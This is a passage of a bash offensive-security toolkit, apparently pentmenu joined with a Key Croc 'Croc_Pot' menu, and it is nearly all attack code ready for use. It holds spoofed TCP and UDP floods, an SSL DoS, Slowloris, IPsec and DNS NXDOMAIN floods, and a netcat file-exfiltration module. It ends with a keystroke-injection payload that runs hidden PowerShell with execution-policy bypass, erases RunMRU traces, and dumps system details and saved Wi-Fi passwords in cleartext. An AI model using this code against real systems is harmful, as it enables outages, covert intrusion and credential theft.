	: ${SOURCE:=i}
#----How many packets to send per second?  default is 10k
	read_all Enter number of packets to send per second default is 10,000 ; RATE=${r_a}
	: ${RATE:=10000}
#----default is 100k, so using default values will send 10k packets per second for 10 seconds
	read_all Enter total number of packets to send default is 100,000 ; TOTAL=${r_a}
	: ${TOTAL:=100000}
	echo -ne "${green}Starting TCP RST Flood...${clear}\n"
#----begin TCP RST flood using values defined earlier
if [ "$SOURCE" = "i" ]; then
	nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 $TARGET
else
	nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
fi
fi
}
##
#----Recon pentmenu START TCP XMAS FLOOD
##
xmasflood() {
	echo -ne "$(Info_Screen '
-TCP XMAS Flood uses hping3...checking for hping3...')\n\n"
if test -f "/usr/sbin/hping3"; then
	echo -ne "${green}hping3 found, continuing!${clear}\n";
#----hping3 is found, so use that for TCP XMAS Flood
#----need a target IP/hostname
	target_input
#----need a port to send TCP XMAS packets to
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----What source address to use? Manually defined, or random, or outgoing interface IP?
	read_all Enter Source IP, or [r]andom or [i]nterface IP default ; SOURE=${r_a}
	: ${SOURCE:=i}
#----should any data be sent with the XMAS packet?  Default is to send no data
	read_all Send data with XMAS packet? [y]es or [n]o default ; SENDDATA=${r_a}
	: ${SENDDATA:=n}
if [[ $SENDDATA = y ]]; then
#----we've chosen to send data, so how much should we send?
	read_all Enter number of data bytes to send default 3000 ; DATA=${r_a}
	: ${DATA:=3000}
#----If not an integer is entered, use default
if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo -ne "${red}Invalid integer!${clear}${yellow} Using data length of 3000 bytes${clear}\n"
fi
#----if $SENDDATA is not equal to y (yes) then send no data
else
	DATA=0
fi
#----start TCP XMAS flood using values defined earlier
if [[ "$SOURCE" =~ ${validate_ip} ]]; then
	echo -ne "${green}Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA --spoof $SOURCE -p $PORT -F -S -R -P -A -U -X -Y $TARGET
elif [ "$SOURCE" = "r" ]; then
	echo -ne "${green}Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA --rand-source -p $PORT -F -S -R -P -A -U -X -Y $TARGET
elif [ "$SOURCE" = "i" ]; then
	echo -ne "${green}Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -d $DATA --flood -p $PORT -F -S -R -P -A -U -X -Y $TARGET
else
	echo -ne "${red}Not a valid option!${clear}${yellow} Using interface IP${clear}\n"
	echo -ne "${green}Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA -p $PORT -F -S -R -P -A -U -X -Y $TARGET
fi
#----No hping3 so using nping for TCP RST Flood
else
	echo -ne "${red}hping3 not found :( ${clear}${yellow}trying nping instead${clear}\n"
	echo -ne "${yellow}Trying TCP XMAS Flood with nping..this will work but is not ideal${clear}\n"
#----need a valid target ip/hostname
	target_input
#----need a valid target port
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----define source IP or use outgoing interface IP
	read_all Enter Source IP or use [i]nterface IP default ; SOURE=${r_a}
	: ${SOURCE:=i}
#----How many packets to send per second?  default is 10k
	read_all Enter number of packets to send per second default is 10,000 ; RATE=${r_a}
	: ${RATE:=10000}
#----default is 100k, so using default values will send 10k packets per second for 10 seconds
	read_all Enter total number of packets to send default is 100,000 ; TOTAL=${r_a}
	: ${TOTAL:=100000}
	echo -ne "${green}Starting TCP XMAS Flood...${clear}\n"
#----begin TCP RST flood using values defined earlier
if [ "$SOURCE" = "i" ]; then
	nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 $TARGET
else
	nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
fi
fi
}
##
#----Recon pentmenu START UDP FLOOD
##
udpflood() {
	echo -ne "$(Info_Screen '
-UDP Flood uses hping3...checking for hping3...')\n\n"
#----check for hping on the local system
if test -f "/usr/sbin/hping3"; then
	echo -ne "${green}hping3 found, continuing!${clear}\n";
#----hping3 is found, so use that for UDP Flood
#----need a valid target IP/hostname
	target_input
#----need a valid target UDP port
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----curently only accepts stdin.  Can't define a file to read from
	read_all Enter random string data to send ; DATA=${r_a}
#----what source IP should we write to sent packets?
	read_all Enter Source IP, or [r]andom or [i]nterface IP default ; SOURE=${r_a}
	: ${SOURCE:=i}
#----start the attack using values defined earlier
if [[ "$SOURCE" =~ ${validate_ip} ]]; then
	echo -ne "${green}Starting UDP Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood --spoof $SOURCE --udp --sign $DATA -p $PORT $TARGET
elif [ "$SOURCE" = "r" ]; then
	echo -ne "${green}Starting UDP Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood --rand-source --udp --sign $DATA -p $PORT $TARGET
elif [ "$SOURCE" = "i" ]; then
	echo -ne "${green}Starting UDP Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood --udp --sign $DATA -p $PORT $TARGET
#----if no valid source option is selected, use outgoing interface IP
else
	echo -ne "${red}Not a valid option! ${clear}${yellow} Using interface IP${clear}\n"
	echo -ne "${green}Starting UDP Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood --udp --sign $DATA -p $PORT $TARGET
fi
#----If no hping3, use nping for UDP Flood instead.  Not ideal but it will work.
else
	echo -ne "${red}hping3 not found :( ${clear}${yellow}trying nping instead${clear}\n"
	echo -ne "${yellow}Trying UDP Flood with nping..${clear}\n"
#----need a valid target IP/hostname
	target_input
#----need a port to send UDP packets to
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----what source address should we use in sent packets?
	read_all Enter Source IP or use [i]nterface IP default ; SOURE=${r_a}
	: ${SOURCE:=i}
#----how many packets should we try to send each second?
	read_all Enter number of packets to send per second default is 10,000 ; RATE=${r_a}
	: ${RATE:=10000}
#----how many packets should we send in total?
	read_all Enter total number of packets to send default is 100,000 ; TOTAL=${r_a}
	: ${TOTAL:=100000}
#----default values will send 10k packets each second, for 10 seconds
#----curently only accepts stdin.  Can't define a file to read from
	read_all Enter string to send data ; DATA=${r_a}
	echo -ne "${green}Starting UDP Flood...${clear}\n"
#----start the UDP flood using values we defined earlier
if [ "$SOURCE" = "i" ]; then
	nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 $TARGET
else
	nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
fi
fi
}
##
#----Recon pentmenu START SSL DOS
##
ssldos() {
echo -ne "$(Info_Screen '
-Using openssl for SSL/TLS DOS')\n\n"
#----need a target IP/hostname
	target_input
#----need a target port
	read_all Enter target port defaults to 443 ; PORT=${r_a}
	: ${PORT:=443}
#----check a valid target port is entered otherwise assume port 443
if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
	PORT=443 && echo -ne "${red}You provided a string, not a port number! ${clear}${yellow} Reverting to port 443${clear}\n"
fi
if [ "$PORT" -lt "1" ]; then
	PORT=443 && echo -ne "${red}Invalid port number chosen! ${clear}${yellow} Reverting to port 443${clear}\n"
elif [ "$PORT" -gt "65535" ]; then
	PORT=443 && echo -ne "${red}Invalid port number chosen! ${clear}${yellow} Reverting to port 443${clear}\n"
else
	echo -ne "${yellow}Using port ${clear}$PORT\n"
fi
#----do we want to use client renegotiation?
	read_all Use client renegotiation? [y]es or [n]o default ; NEGOTIATE=${r_a}
	: ${NEGOTIATE:=n}
if [[ $NEGOTIATE = y ]]; then
#----if client renegotiation is selected for use, launch the attack supporting it
	echo -ne "${green}Starting SSL DOS attack...Use 'Ctrl c' to quit${clear}\n" && sleep 1
while : for i in {1..10}
	do echo "spawning instance, attempting client renegotiation"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
elif [[ $NEGOTIATE = n ]]; then
#----if client renegotiation is not requested, lauch the attack without support for it
	echo -ne "${green}Starting SSL DOS attack...Use 'Ctrl c' to quit${clear}\n" && sleep 1
while : for i in {1..10}
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
#----if an invalid option is chosen for client renegotiation, launch the attack without it
else
	echo -ne "${red}Invalid option, assuming no client renegotiation${clear}\n${green}Starting SSL DOS attack...Use 'Ctrl c' to quit${clear}\n" && sleep 1
while : for i in {1..10}
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
fi
}
##
#----Recon pentmenu START SLOW LORIS
##
slowloris() {
	echo -ne "$(Info_Screen '
-Using netcat for Slowloris attack....')\n" && sleep 1
#----need a target IP or hostname
	target_input
#----need a target port
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----how many connections should we attempt to open with the target?
#----there is no hard limit, it depends on available resources.  Default is 2000 simultaneous connections
	read_all Enter number of connections to open default 2000 ; CONNS=${r_a}
	: ${CONNS:=2000}
#----ensure a valid integer is entered
if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
	CONNS=2000 && echo -ne "${red}Invalid integer! ${clear}${yellow} Using 2000 connections${clear}\n"
fi
#----how long do we wait between sending header lines?
#----too long and the connection will likely be closed
#----too short and our connections have little/no effect on server
#----either too long or too short is bad.  Default random interval is a sane choice
echo -ne "\n\e[38;5;19;1;48;5;245mChoose interval between sending headers.${clear}\n"
read_all Default is [r]andom, between 5 and 15 seconds, or enter interval in seconds ; INTERVAL=${r_a}
	: ${INTERVAL:=r}
if [[ "$INTERVAL" = "r" ]]; then
#----if default (random) interval is chosen, generate a random value between 5 and 15
#----note that this module uses $RANDOM to generate random numbers, it is sufficient for our needs
	INTERVAL=$((RANDOM % 11 + 5))
#----check that r (random) or a valid number is entered
elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]; then
#----if not r (random) or valid number is chosen for interval, assume r (random)
	INTERVAL=$((RANDOM % 11 + 5)) && echo -ne "${red}Invalid integer! ${clear}${yellow} Using random value between 5 and 15 seconds${clear}\n"
fi
#----run stunnel_client function
stunnel_client
if [[ "$SSL" = "y" ]]; then
#----if SSL is chosen, set the attack to go through local stunnel listener
	echo -ne "${green}Launching Slowloris....Use 'Ctrl c' to exit prematurely${clear}\n" && sleep 1
	i=1
while [ "$i" -le "$CONNS" ]; do
	echo -ne "${yellow}Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds${clear}\n" ; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT 2>/dev/null 1>/dev/null & i=$((i + 1)); done
	echo -ne "${yellow}Opened $CONNS connections....returning to menu${clear}\n"
else
#----if SSL is not chosen, launch the attack on the server without using a local listener
	echo -ne "${green}Launching Slowloris....Use 'Ctrl c' to exit prematurely${clear}\n" && sleep 1
	i=1
while [ "$i" -le "$CONNS" ]; do
	echo -ne "${yellow}Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds${clear}\n" ; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT 2>/dev/null 1>/dev/null & i=$((i + 1)); done
#----return to menu once requested number of connections has been opened or resources are exhausted
	echo -ne "${yellow}Opened $CONNS connections....returning to menu${clear}\n"
fi
}
##
#----Recon pentmenu START IPSEC DOS
##
ipsecdos() {
	echo -ne "$(Info_Screen '
-This module will attempt to spoof an IPsec server, with a spoofed source address')\n\n"
	target_input
#----launch DOS with a random source address by default
	echo -ne "${green}IPsec DOS underway...use 'Ctrl C' to stop${clear}\n" &&
while :
do ike-scan -A -B 100M -t 1 --sourceip=random $TARGET 1>/dev/null; ike-scan -B 100M -t 1 -q --sourceip=random $TARGET 1>/dev/null
done
}
##
#----Recon pentmenu START DISTRACTION
##
distractionscan() {
	echo -ne "$(Info_Screen '
-This module will send a TCP SYN scan with a spoofed source address"
-This module is designed to be obvious, to distract your target from any real scan
-or other activity you may actually be performing')\n\n"
#----need target IP/hostname
	target_input
#----need a spoofed source address
	read_all Enter spoofed source address ; SOURE=${r_a}
#----use hping to perform multiple obvious TCP SYN scans
for i in {1..50}; do echo -ne "${green}sending scan $i${clear}" && hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
}
##
#----Recon pentmenu START NXDOMAIN FLOOD
##
nxdomainflood() {
	echo -ne "$(Info_Screen '
-This module is designed to stress test a DNS server by flooding it with queries
-for domains that do not exist')\n\n"
	read_all Enter the IP address of the target DNS server ; DNSTARGET=${r_a}
	echo -ne "${green}Starting DNS NXDOMAIN Query Flood to $DNSTARGET${clear}\n" && sleep 1
	echo -ne "${yellow}No output will be shown. Use 'Ctrl c' to stop!${clear}\n"
#loop forever!
while :
do
#create transaction ID for DNS query
	TRANS=$(( $RANDOM ))
#convert to hex
	printf -v TRANSID "%x\n" "$TRANS"
#cut it into bytes
	TRANSID1=$(echo $TRANSID | cut -b 1,2 | xargs)
	TRANSID2=$(echo $TRANSID | cut -b 3,4 | xargs)
#if single byte or no byte, prepend 0
if [[ ${#TRANSID1} = "1" ]]; then
	TRANSID1=0$TRANSID
elif [[ ${#TRANSID2} = "0" ]]; then
	TRANSID2=00
elif [[ ${#TRANSID2} = "1" ]]; then
	TRANSID2=0$TRANSID
fi
#now we have transaction ID, generate random alphanumeric name to query
	TLDLIST=(com br net org cz au co jp cn ru in ir ua ca xyz site top icu vip online de $RANDOM foo)
	TLD="${TLDLIST[ $(expr $(( $RANDOM )) \% ${#TLDLIST[*]}) ]}"
	RANDLONG=$(( $RANDOM % 20 + 1 ))
	STRING=$(< /dev/urandom tr -cd '[:alnum:]' | tr -d '\\' | head -c $RANDLONG)
#calculate length of name we are querying as hex
	STRINGLEN=(${#STRING})
	printf -v STRINGLENHEX "%x\n" "$STRINGLEN"
	STRINGLENHEX=$(echo $STRINGLENHEX | xargs)
if [[ ${#STRINGLENHEX} = "1" ]]; then 
	STRINGLENHEX=0$STRINGLENHEX
fi
#do the same for TLD
	TLDLEN=(${#TLD})
	printf -v TLDLENHEX "%x\n" "$TLDLEN"
	TLDLENHEX=$(echo $TLDLENHEX | xargs)
#forge a DNS request and send to netcat
	ATTACKSTRING="\x$TRANSID1\x$TRANSID2\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x$STRINGLENHEX$STRING\x$TLDLENHEX$TLD\x00\x00\x01\x00\x01"
#echo $ATTACKSTRING
	echo -ne $ATTACKSTRING | nc -u -w 1 $DNSTARGET 53
done
}
##
#----Recon pentmenu EXTRACTION menu
##
extractionmenu() {
	echo -ne "$(Info_Screen '
-EXTRACTION MODULES
-Send File This module uses netcat to send data with TCP or UDP.
-Listener - uses netcat to open a listener on a configurable TCP or UDP port.')\n\n"
MenuTitle EXTRACTION MENU ; MenuColor 20 1 SEND FILE ; MenuColor 20 2 CREATE LISTENER ; MenuColor 20 3 RETURN TO MAIN MENU ; MenuEnd 23
	case $m_a in
	1) sendfile ;; 2) listener ;; 3) mainmenu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) mainmenu ;; *) invalid_entry ; extractionmenu ;;
	esac
}
##
#----Recon pentmenu START SENDFILE
##
sendfile() {
echo -ne "$(Info_Screen '
-This module will allow you to send a file over TCP or UDP
-You can use the Listener to receive such a file')\n\n"
	read_all Enter protocol, [t]cp default or [u]dp ; PROTO=${r_a}
	: ${PROTO:=t}
#----if not t (tcp) or u (udp) is chosen, assume tcp required
if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
	echo -ne "${red}Invalid protocol option selected,${clear}${yellow} assuming tcp!${clear}\n" && PROTO=t && echo ""
fi
#----need to know the IP of the receiving end
	read_all Enter the IP of the receving server ; RECEIVER=${r_a}
#----need to know a destination port on the server
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----what file are we sending?
	read_all Enter the FULL PATH of the file you want to extract ; EXTRACT=${r_a}
#----send the file
	echo -ne "${green}Sending the file to${clear} $RECEIVER:$PORT\n"
if [ "$PROTO" = "t" ]; then
	nc -w 3 -n -N $RECEIVER $PORT < $EXTRACT
else
	nc -n -N -u $RECEIVER $PORT < $EXTRACT
fi
	echo "Done"
#----generate hashes of file we are sending
echo -ne "${yellow}Generating hash checksums${clear}\n"
md5sum $EXTRACT
echo ""
sha512sum $EXTRACT
sleep 1
}
##
#----Recon pentmenu START LISTENER
##
listener() {
echo -ne "$(Info_Screen '
-This module will create a TCP or UDP listener using netcat
-Any data (string or file) received will be written out to ./pentmenu.listener.out')\n"
	read_all Enter protocol, [t]cp default or [u]dp ; PROTO=${r_a}
	: ${PROTO:=t}
#----if not t (tcp) or u (udp) is chosen, assume tcp listener required
if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
	echo -ne "${red}Invalid protocol option selected,${clear}${yellow} assuming tcp!${clear}" && PROTO=t && echo ""
fi
#----show listening ports on system using ss (if available) otherwise use netstat
	echo -ne "$(Info_Screen '
-Listing current listening ports on this system.
-Do not attempt to create a listener on one of these ports, it will not work.')\n\n"
if test -f "/bin/ss"; then
	LISTPORT=ss;
else
	LISTPORT=netstat
fi
#----now we can ask what port to create listener on
#----it cannot of course listen on a port already in use
	$LISTPORT -$PROTO -n -l
	read_all Enter port number to listen on defaults to 8000 ; PORT=${r_a}
	: ${PORT:=8000}
#----if not an integer is entered, assume default port 8000
if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
	PORT=8000 && echo -ne "${red}You provided a string, not a port number! ${clear}${yellow} Reverting to port 8000${clear}\n"
fi
#----ensure a valid port number, between 1 and 65,535 (inclusive) is entered
if [ "$PORT" -lt "1" ]; then
	PORT=8000 && echo -ne "${red}Invalid port number chosen! ${clear}${yellow} Reverting to port 8000${clear}\n"
elif [ "$PORT" -gt "65535" ]; then
	PORT=8000 && echo -ne "${red}Invalid port number chosen! ${clear}${yellow} Reverting to port 8000${clear}\n"
fi
#----define where to save everything received to the listener
	read_all Enter output file defaults to pentmenu.listener.out ; OUTFILE=${r_a}
	: ${OUTFILE:=pentmenu.listener.out}
	echo -ne "\n${yellow}Use ctrl c to stop${clear}\n"
#----create the listener
if [ "$PROTO" = "t" ] && [ "$PORT" -lt "1025" ]; then
	nc -n -l -v -p $PORT > $OUTFILE
elif [ "$PROTO" = "t" ] && [ "$PORT" -gt "1024" ]; then
	nc -n -l -v -p $PORT > $OUTFILE
elif [ "$PROTO" = "u" ] && [ "$PORT" -lt "1025" ]; then
	nc -n -u -k -l -v -p $PORT > $OUTFILE
elif [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
	nc -n -u -k -l -v -p $PORT > $OUTFILE
fi
#----done message and checksums will only work for tcp file transfer
#----with udp, the connection has to be manually closed with 'ctrl C'
sync && echo -ne "\n${green}Done${clear}\n"
#----generate hashes of file received
echo -ne "${green}Generating hash checksums${clear}\n"
md5sum $OUTFILE
echo ""
sha512sum $OUTFILE
sleep 1
}
##
#----Recon pentmenu START SHOW README
##
#----use curl to show the readme file
showreadme() {
	user_agent_random
curl -s -A "$userAgent" https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md | more
}
##
#----Recon pentmenu START STUNNEL
##
stunnel_client() {
	read_all use SSL/TLS? [y]es or [n]o default ; SSL=${r_a}
	: ${SSL:=n}
#----if not using SSL/TLS, carry on what we were doing
#----otherwise create an SSL/TLS tunnel using a local listener on TCP port 9991
if [[ "$SSL" = "y" ]]; then
	echo -ne "${yellow}Using SSL/TLS${clear}\n"
	LHOST=127.0.0.1
	LPORT=9991
#----ascertain if stunnel is defined in /etc/services and if not, add it & set permissions correctly
	grep -q $LPORT /etc/services
if [[ $? = 1 ]]; then
	echo "Adding pentmenu stunnel service to /etc/services" && chmod 777 /etc/services && echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services && chmod 644 /etc/services
fi
#----is ss is available, use that to shoew listening ports
if test -f "/bin/ss"; then
	LISTPORT=ss;
#otherwise use netstat
else
	LISTPORT=netstat
fi
#----show listening ports and check for port 9991
	$LISTPORT -tln | grep -q $LPORT
if [[ "$?" = "1" ]]; then
#----if nothing is running on port 9991, create stunnel configuration
	echo -ne "${yellow}Creating stunnel client on ${clear} $LHOST:$LPORT\n"
	rm -f /etc/stunnel/pentmenu.conf;
	touch /etc/stunnel/pentmenu.conf && chmod 777 /etc/stunnel/pentmenu.conf
	echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
	echo "client=yes" >> /etc/stunnel/pentmenu.conf
	echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
	echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
	echo "verify=0" >> /etc/stunnel/pentmenu.conf
	chmod 644 /etc/stunnel/pentmenu.conf
	stunnel /etc/stunnel/pentmenu.conf && sleep 1
#----if stunnel listener is already active we don't bother recreating it
else
	echo -ne "${yellow}Looks like stunnel is already listening on port 9991, so not recreating${clear}\n"
fi
fi
}
mainmenu
}
##
#----Windows Info Grabber Scan Bash Bunny payload
##
function windows_check() {
	echo -ne "$(Info_Screen '
-This is an Bash Bunny payload (Info Grabber)
-Big Thanks Simen Kjeserud (Original AUTHOR), Gachnang, DannyK999
-https://github.com/hak5/bashbunny-payloads
-This will Scan an Windows pc and collect alot of information
-WINDOWS SCAN CAN TAKE UP TO 1 MIN TO RUN
-Save to loot/Croc_pot folder')\n"
if [ "$(OS_CHECK)" = WINDOWS ]; then
	read_all START WINDOWS INFO GRABBER Y/N AND PRESS [ENTER]
	case $r_a in
[yY] | [yY][eE][sS])
	local LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
	local WIN_PS=/root/udisk/tools/Croc_Pot/run.ps1
	local WIN_PS_A=/root/udisk/tools/Croc_Pot/info.ps1
start_win_stat() {
	rm -f ${LOOT_WIND}
	ATTACKMODE HID STORAGE
	sleep 5 ; Q GUI r ; sleep 1 ; LED ATTACK ; Q STRING "powershell -nop -ex Bypass -w Hidden" ; Q ENTER ; sleep 5
	Q STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\run.ps1')" ; Q ENTER ; sleep 45
	Q STRING "exit" ; Q ENTER ; ATTACKMODE HID ; LED FINISH ; sleep 3
	LED OFF
}
	if [[ -e "${WIN_PS}" && "${WIN_PS_A}" ]]; then
		start_win_stat | tee ${LOOT_WIND}
		cat ${LOOT_WIND}
	else
	sleep 1
echo -ne "powershell \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue\"\n\n\$VolumeName = \"KeyCroc\"\n\$computerSystem = Get-CimInstance CIM_ComputerSystem\n\$backupDrive = \$null\nGet-WmiObject win32_logicaldisk | % {\n
if (\$_.VolumeName -eq \$VolumeName) {\n        \$backupDrive = \$_.DeviceID\n    }\n}\n\n\$TARGETDIR = \$backupDrive + \"\loot\"\nif(!(Test-Path -Path \$TARGETDIR )){\n    New-Item -ItemType directory -Path \$TARGETDIR\n}\n\n\$TARGETDIR = \$backupDrive + \"\loot\Croc_Pot\"\nif(!(Test-Path -Path \$TARGETDIR )){\n   New-Item -ItemType directory -Path \$TARGETDIR\n}\n
\$backupPath = \$backupDrive + \"\loot\Croc_Pot\" + \"\KeyCroc_Wind_Log\" + \".txt\"\n\$TARGETDIR = \$MyInvocation.MyCommand.Path\n\$TARGETDIR = \$TARGETDIR -replace \".......\$\"\ncd \$TARGETDIR\nPowerShell.exe -ExecutionPolicy Bypass -File info.ps1 > \$backupPath" >> ${WIN_PS}
echo -ne "try\n{\n\$computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content\n}\ncatch\n{\n\$computerPubIP = \"Error getting Public IP\"\n}\n\$computerIP = Get-WmiObject Win32_NetworkAdapterConfiguration | Where {\$_.Ipaddress.length -gt 1}\n\$IsDHCPEnabled = \$False\n
\$Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter \"DHCPEnabled=\$True\" | ? {\$_.IPEnabled}\nforeach (\$Network in \$Networks) {\nIf(\$network.DHCPEnabled) {\n\$IsDHCPEnabled = \$True\n  }\n[string[]]\$computerMAC = \$Network.MACAddress\n}\n\n\$computerSystem = Get-CimInstance CIM_ComputerSystem\n\$computerBIOS = Get-CimInstance CIM_BIOSElement\n
\$computerOs = Get-WmiObject Win32_operatingsystem | select Caption, CSName, Version, @{Name=\"InstallDate\";Expression={([WMI]'').ConvertToDateTime(\$_.InstallDate)}} , @{Name=\"LastBootUpTime\";Expression={([WMI]'').ConvertToDateTime(\$_.LastBootUpTime)}}, @{Name=\"LocalDateTime\";Expression={([WMI]'').ConvertToDateTime(\$_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory | Format-List\n\$computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List\n\$computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List\n
\$computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { \"{0:N1} GB\" -f (\$_.sum / 1GB)}\n\$computerRam = Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name=\"Capacity\";Expression={ \"{0:N1} GB\" -f (\$_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table\n\n\$driveType = @{\n   2=\"Removable disk \"\n   3=\"Fixed local disk \"\n   4=\"Network disk \"\n   5=\"Compact disk \"}\n
\$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name=\"DriveType\";Expression={\$driveType.item([int]\$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name=\"Size_GB\";Expression={\"{0:N1} GB\" -f (\$_.Size / 1Gb)}}, @{Name=\"FreeSpace_GB\";Expression={\"{0:N1} GB\" -f (\$_.FreeSpace / 1Gb)}}, @{Name=\"FreeSpace_percent\";Expression={\"{0:N1}%\" -f ((100 / (\$_.Size / \$_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name=\"Size GB\"; Expression={\$_.Size_GB}; align=\"right\"; }, @{ Name=\"FreeSpace GB\"; Expression={\$_.FreeSpace_GB}; align=\"right\"; }, @{ Name=\"FreeSpace %\"; Expression={\$_.FreeSpace_percent}; align=\"right\"; }\n
\$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi](\$_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table\n\n\$RDP\nif ((Get-ItemProperty \"hklm:\System\CurrentControlSet\Control\Terminal Server\").fDenyTSConnections -eq 0) {\n    \$RDP = \"RDP is Enabled\"\n} else {\n    \$RDP = \"RDP is NOT Enabled\"\n}\n\n\$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { \$_.MACAddress -notlike \$null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress\n
\$WLANProfileNames = @()\n\$Output = netsh.exe wlan show profiles | Select-String -pattern \":\"\nForeach(\$WLANProfileName in \$Output){\n    \$WLANProfileNames += ((\$WLANProfileName -split \":\")[1]).Trim()\n}\n\$WLANProfileObjects = @()\n
Foreach(\$WLANProfileName in \$WLANProfileNames){\n    try{\n        \$WLANProfilePassword = (((netsh.exe wlan show profiles name=\"\$WLANProfileName\" key=clear | select-string -Pattern \"Key Content\") -split \":\")[1]).Trim()\n    } Catch {\n        \$WLANProfilePassword = \"The password is not stored in this profile\"\n    }\n    \$WLANProfileObject = New-Object PSCustomobject\n    \$WLANProfileObject | Add-Member -Type NoteProperty -Name \"ProfileName\" -Value \$WLANProfileName\n
        \$WLANProfileObject | Add-Member -Type NoteProperty -Name \"ProfilePassword\" -Value \$WLANProfilePassword\n    \$WLANProfileObjects += \$WLANProfileObject\n    Remove-Variable WLANProfileObject\n}\n\n\$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID\n
    \$process = Get-WmiObject Win32_process | select Handle, ProcessName, ExecutablePath, CommandLine\n\n\$listener = Get-NetTCPConnection | select @{Name=\"LocalAddress\";Expression={\$_.LocalAddress + \":\" + \$_.LocalPort}}, @{Name=\"RemoteAddress\";Expression={\$_.RemoteAddress + \":\" + \$_.RemotePort}}, State, AppliedSetting, OwningProcess\n\$listener = \$listener | foreach-object {\n    \$listenerItem = \$_\n    \$processItem = (\$process | where { [int]\$_.Handle -like [int]\$listenerItem.OwningProcess })\n
